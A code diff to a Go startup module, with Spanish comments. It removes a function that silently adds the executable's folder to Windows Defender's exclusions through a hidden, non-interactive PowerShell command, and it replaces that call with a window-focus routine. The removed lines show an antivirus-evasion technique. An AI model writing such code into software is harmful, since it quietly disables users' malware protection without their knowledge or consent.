@@ -1,43 +1,13 @@
 ﻿package core
 
-import (
-"fmt"
-"os"
-"os/exec"
-"path/filepath"
-"syscall"
-)
-
-// EnsureDefenderExclusion comprueba y asegura que la carpeta de ejecución esté excluida en Defender
-func EnsureDefenderExclusion() {
-exePath, err := os.Executable()
-if err != nil {
-return
-}
-realPath, err := filepath.EvalSymlinks(exePath)
-if err != nil {
-realPath = exePath
-}
-exeDir := filepath.Dir(realPath)
-
-psCmd := fmt.Sprintf(
-"if (-not ((Get-MpPreference).ExclusionPath -contains '%s')) { Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue }",
-exeDir, exeDir,
-)
-
-cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psCmd)
-cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-_ = cmd.Run()
-}
-
-// RunStartupSequence ejecuta el flujo de inicio esperado por main.go
+// RunStartupSequence orquesta la inicialización sin disparar subventanas que roben foco
 func RunStartupSequence() bool {
 CleanOldBinary()
-EnsureDefenderExclusion()
+ForceForegroundWindow()
 return IsAdmin()
 }
 
-// CheckStartup mantiene compatibilidad si algún otro paquete lo invoca
+// CheckStartup mantiene compatibilidad
 func CheckStartup() bool {
 return RunStartupSequence()
 }
